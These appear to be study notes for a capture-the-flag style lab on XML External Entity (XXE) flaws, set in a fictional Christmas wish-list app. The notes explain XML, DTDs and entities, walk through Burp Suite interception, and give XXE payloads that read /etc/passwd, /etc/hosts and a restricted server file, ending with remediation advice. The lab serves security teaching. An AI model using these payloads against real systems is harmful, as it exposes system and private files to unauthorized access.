Day 5

Narrative Summary

  • Setting: Wareville, a town with a festive atmosphere and tech-savvy population.
  • Problem: A dejected boy wishes for a teddy bear his family cannot afford.
  • Solution: Software and Mayor Malware create a platform called "WishVille" to collect and fulfill the townspeople's Christmas wishes.
  • Challenge: Due to the rush to launch, the platform lacks proper security testing, leading to potential vulnerabilities.

Learning Objectives

  1. Understand XML and its components.
  1. Explore XML External Entity (XXE) vulnerabilities.
  1. Learn to exploit XXE.
  1. Identify and implement remediation measures.

Important Concepts

  1. Extensible Markup Language (XML):
    • XML is used to transport and store structured data.
    • Comparable to a filing cabinet, where tags act as folders organizing data.
    • Example:
      xml
Copy code
<people>
   <name>Glitch</name>
   <address>Wareville</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>
  1. Document Type Definition (DTD):
    • Defines the structure of XML documents (rules for allowed elements and attributes).
    • Example:
      xml
Copy code
<!DOCTYPE people [
   <!ELEMENT people(name, address, email, phone)>
   <!ELEMENT name (#PCDATA)>
   <!ELEMENT address (#PCDATA)>
   <!ELEMENT email (#PCDATA)>
   <!ELEMENT phone (#PCDATA)>
]>
  1. Entities in XML:
    • Placeholders for repeated data or references to internal/external files.
    • Example of an external entity:
      xml
Copy code
<!ENTITY ext SYSTEM "http://tryhackme.com/robots.txt">
  1. XML External Entity (XXE):
    • Vulnerability arising from improper handling of external entities in XML parsers.
    • Can expose sensitive files or execute malicious code.
    • Example exploit:
      xml
Copy code
<!DOCTYPE people[
   <!ENTITY thmFile SYSTEM "file:///etc/passwd">
]>
<people>
   <address>&thmFile;</address>
</people>

Practical Application

  1. Connecting to the Platform:
    • Use tools like Burp Suite to intercept and analyze web traffic.
    • Access the WishVille application hosted on http://MACHINE_IP.
  1. Flow of Application:
    • Browse and add products to a wishlist at product.php.
    • View the cart at cart.php and proceed to checkout.
  1. Intercepting Requests:
    • Burp Suite configuration:
      • Proxy -> HTTP history tab: Intercept and modify requests.
    • Example intercepted XML:
      xml
Copy code
<wishlist>
   <user_id>1</user_id>
   <item>
      <product_id>1</product_id>
   </item>
</wishlist>
  1. Exploitation via XXE:
    • Update XML payload to include an external entity:
      xml
Copy code
<!DOCTYPE foo [
   <!ENTITY payload SYSTEM "/etc/hosts">
]>
<wishlist>
   <item>
      <product_id>&payload;</product_id>
   </item>
</wishlist>
    • Use Burp Suite's Repeater tab to send the modified payload and retrieve sensitive data.
  1. Accessing Admin Pages:
    • Target restricted files like /var/www/html/wishes/wish_1.txt.
    • Updated XML payload to exploit:
      xml
Copy code
<!DOCTYPE foo [
   <!ENTITY payload SYSTEM "/var/www/html/wishes/wish_1.txt">
]>
<wishlist>
   <item>
      <product_id>&payload;</product_id>
   </item>
</wishlist>

Key Takeaways

  • Impact of XXE Vulnerabilities: Exposure of sensitive information and unauthorized system access.
  • Importance of Secure XML Parsing:
    • Disable external entities (libxml_disable_entity_loader).
    • Validate and sanitize input before processing.
  • Proactive Measures: Conduct thorough security testing before deployment.
